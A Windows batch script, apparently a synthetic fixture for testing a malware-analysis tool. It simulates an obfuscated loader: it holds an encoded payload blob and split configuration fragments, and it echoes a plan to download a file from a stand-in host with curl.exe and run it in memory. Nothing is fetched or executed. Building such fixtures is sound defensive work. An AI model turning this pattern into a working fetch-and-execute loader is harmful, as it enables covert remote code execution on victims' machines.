@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|rotate_left
rem HUNTRESS-MATERIAL:7Hpi+OboyuDmesLG4urS5Mq+5Mra3ujKWMjS5uDC6MbQvtrK2t7k8vjCyMLg6Mrkesbq5NhcyvDK+Obows7Kvsbe6tzoemL4zuTC4NB65tLcztjK+NzK8Oi+2MLczurCzsp63N7cyvjGwtrgwtLO3L7SyHrGwtrgwtLO3FpmwsbEYGpuZGZm+Ork2HrQ6Ojg5nReXmbCxsRgam5kZmZcyvDC2uDYylzS3OzC2NLIXnBkYszGbGRgXMjC6A==
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "fragment0=v=1|steps=acquire_remote,dispatch_memory|adapte"
set "fragment1=r=curl.exe|stage_count=1|graph=single|next_lang"
set "fragment2=uage=none|campaign_id=campaign-3acb057233|url=h"
set "fragment3=ttps://3acb057233.example.invalid/821fc620.dat"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=562f64fb"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "recovered_configuration=!fragment0!!fragment1!!fragment2!!fragment3!"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe GET https://3acb057233.example.invalid/821fc620.dat then dispatch memory
exit /b 0
